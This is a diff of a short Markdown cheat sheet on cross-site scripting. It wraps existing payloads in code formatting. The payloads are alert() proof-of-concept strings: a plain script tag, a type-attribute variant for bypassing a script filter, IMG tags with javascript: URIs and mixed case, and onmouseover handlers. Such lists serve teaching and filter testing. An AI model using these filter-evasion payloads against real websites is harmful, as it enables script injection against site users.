@@ -2,7 +2,7 @@
 
 
 ## No security
-<script>alert(1)</script>
+`<script>alert(1)</script>`
 
 
 Imagine that the server sanitizes `<script>`. To bypass that we can use:
@@ -10,13 +10,16 @@ Imagine that the server sanitizes `<script>`. To bypass that we can use:
 `<script type=text/javascript>alert(2)</script>`
 
 ### Using the IMG-tag
+```
 <IMG SRC="javascript:alert('XSS');">
 <IMG SRC=javascript:alert('XSS')>
 <IMG SRC=JaVaScRiPt:alert('XSS')>
 <IMG SRC=javascript:alert("XSS")>
 <IMG onmouseover="alert('xxs')">
+```
 
 
 ### Onmouseover
+```
 <a onmouseover="alert(2)">d</a>
-
+```
